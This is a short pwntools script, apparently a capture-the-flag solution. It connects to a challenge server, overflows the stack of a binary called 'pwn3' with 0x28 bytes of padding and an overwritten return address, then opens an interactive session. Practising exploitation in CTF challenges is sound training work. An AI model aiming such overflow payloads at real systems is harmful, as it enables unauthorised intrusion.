from pwn import * 
import struct

HOST,PORT = 'chall.csivit.com', 30013
#r = process('./pwn3')
r = remote(HOST,PORT)
addr = p64(0x00000000004011ce)
pad = 0x28 * b'A'
r.sendline(pad+addr)
r.interactive()
